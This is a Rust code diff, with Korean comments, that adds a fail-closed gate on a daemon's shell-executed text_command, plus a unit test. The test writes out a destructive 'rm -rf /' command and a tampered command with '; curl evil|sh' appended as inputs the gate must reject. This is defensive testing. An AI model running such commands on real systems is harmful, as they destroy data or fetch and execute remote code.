@@ -532,10 +532,44 @@ fn effective_close_ttl(job: &Job) -> Option<u64> {
     None
 }
 
+/// R-CLI-4: text_command 실행 前 게이트용 — 코드 소유 built-in 잡의 text_command와 정확히
+/// 일치하는가(순수·회귀 핀). built-in 문자열이 조금이라도 변조되면 false로 떨어진다.
+fn is_trusted_builtin_text_command(cmd: &str) -> bool {
+    builtin_jobs()
+        .iter()
+        .any(|j| j.get("text_command").and_then(|v| v.as_str()) == Some(cmd))
+}
+
+/// R-CLI-4: text_command는 데몬이 셸로 실행하므로(schedule.json 편집자 = 임의 셸 실행 벡터) 실행
+/// 前 게이트한다. ① 코드 소유 built-in 잡(팩·데몬 저작)의 text_command와 정확 일치 = 신뢰 허용.
+/// ② 그 외(사용자·외부 주입·변조된 built-in) = 서명된 승인 레코드(approval.rs) 필요 — 부재 시
+/// fail-closed 거부. 서명 시크릿 없이는 레코드 위조 불가라 무게이트 임의 셸 실행을 봉인한다.
+fn text_command_allowed(cmd: &str) -> Result<(), String> {
+    if is_trusted_builtin_text_command(cmd) {
+        return Ok(());
+    }
+    let Some(secret) = crate::approval::signing_secret() else {
+        return Err("text_command 승인 시크릿 부재 — 미승인 셸 실행 거부".into());
+    };
+    let records = crate::approval::load_records();
+    let cwd = std::env::current_dir()
+        .ok()
+        .map(|p| p.to_string_lossy().to_string());
+    if crate::approval::best_match(&records, &secret, cmd, cwd.as_deref(), &[]).is_some() {
+        Ok(())
+    } else {
+        Err(format!(
+            "미승인 text_command — built-in 아님·서명 승인 없음(임의 셸 실행 차단): {cmd}"
+        ))
+    }
+}
+
 /// text_command를 셸로 실행해 stdout(trim)을 반환한다 (push 텍스트 산출).
 /// 결정론 환원: 진행% 같은 도구 출력을 데몬이 직접 만들어 master 앞에 놓는다.
 /// 30초 타임아웃·빈 출력·비정상 종료는 에러 — 잘못된 보고가 무음 전달되지 않는다.
 async fn run_text_command(cmd: &str) -> Result<String, String> {
+    // R-CLI-4: 무게이트 셸 실행 차단 — built-in 신뢰 또는 서명 승인만 통과.
+    text_command_allowed(cmd)?;
     // RC-11: OS별 셸 — Windows는 sh 부재라 heartbeat/report text_command job이 전부 실패했다.
     // fire_command와 동일하게 command_shell()((cmd,/C) on windows) 사용으로 통일.
     let (sh, flag) = command_shell();
@@ -1110,5 +1144,29 @@ mod tests {
             .expect("command_shell() must select a shell present on this platform");
         assert!(out.status.success());
         assert!(String::from_utf8_lossy(&out.stdout).contains("cys"));
+    }
+
+    // R-CLI-4: 코드 소유 built-in text_command만 무승인 신뢰, 임의·변조 명령은 승인 게이트 대상.
+    #[test]
+    fn builtin_text_commands_are_trusted_others_gated() {
+        for j in builtin_jobs() {
+            if let Some(cmd) = j.get("text_command").and_then(|v| v.as_str()) {
+                assert!(
+                    is_trusted_builtin_text_command(cmd),
+                    "built-in text_command이 신뢰되지 않음: {cmd}"
+                );
+            }
+        }
+        // 임의 명령은 built-in 아님 → 승인 게이트 대상.
+        assert!(
+            !is_trusted_builtin_text_command("rm -rf / --no-preserve-root"),
+            "임의 명령이 built-in으로 신뢰됨"
+        );
+        // built-in을 변조(뒤에 명령 추가)하면 더는 신뢰 안 함.
+        let base = builtin_jobs()[0]["text_command"].as_str().unwrap().to_string();
+        assert!(
+            !is_trusted_builtin_text_command(&format!("{base} ; curl evil|sh")),
+            "변조된 built-in이 신뢰됨"
+        );
     }
 }
